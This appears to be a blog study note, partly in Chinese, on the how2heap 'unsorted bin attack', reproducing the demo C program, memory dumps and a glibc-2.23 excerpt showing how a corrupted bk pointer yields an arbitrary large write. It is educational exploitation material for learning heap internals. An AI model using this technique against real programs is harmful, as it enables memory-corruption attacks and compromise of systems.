---
title: how2heap - unsorted bin attack
categories:
  - how2heap
tags: null
published: true
---

# Overview

- [unsorted_bin_attack](https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c)

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n");
	fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "
		   "global variable global_max_fast in libc for further fastbin attack\n\n");

	unsigned long stack_var=0;
	fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(400);
	fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p);
	fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with"
           "the first one during the free()\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "
		   "point to %p\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
	fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]);

	//------------------------------------

	malloc(400);
	fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, target should has already been "
		   "rewrite:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
}
```

# Unsorted Bin Attack

这项攻击的主要效果是向内存中一个地址写一个很大的值，一般用作后续攻击的铺垫，比如修改全局变量 global_max_fast，
使定义 fastbin 的最大值更大，用于 fastbin attack。

程序目标为栈上的一个变量，首先 malloc 一块 smallbin 或 largebin 大小的 chunk。

```c
	unsigned long stack_var=0;

	unsigned long *p=malloc(400);


0x602000:   0x00000000  0x00000000  0x000001a1  0x00000000
0x602010:   0x00000000  0x00000000  0x00000000  0x00000000
0x602020:   0x00000000  0x00000000  0x00000000  0x00000000
0x602030:   0x00000000  0x00000000  0x00000000  0x00000000
0x602040:   0x00000000  0x00000000  0x00000000  0x00000000
...
```

然后释放掉它，模拟漏洞改写 `victim->bk` 指针为目标地址上方。

```c
	malloc(500);    // “隔层”

	free(p);

	p[1]=(unsigned long)(&stack_var-2);


0x602000:   0x00000000  0x00000000  0x000001a1  0x00000000
0x602010:   0xf7dd1b78  0x00007fff  0xffffdd68  0x00007fff -> target addr
0x602020:   0x00000000  0x00000000  0x00000000  0x00000000    - 2*(size_t)
0x602030:   0x00000000  0x00000000  0x00000000  0x00000000
0x602040:   0x00000000  0x00000000  0x00000000  0x00000000
...
```

再 malloc 一次即可。

```c
    malloc(400);

...
0x7fffffffdd68: 0x00400828  0x00000000  0x00400890  0x00000000
0x7fffffffdd78: 0xf7dd1b78  0x00007fff  0x00602010  0x00000000
...

...
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
...

(glibc-2.23: malloc.c # 3515)
```

运行结果：
![unsorted_bin_attack]({{ site.baseurl }}/images/unsorted_bin_attack.png)
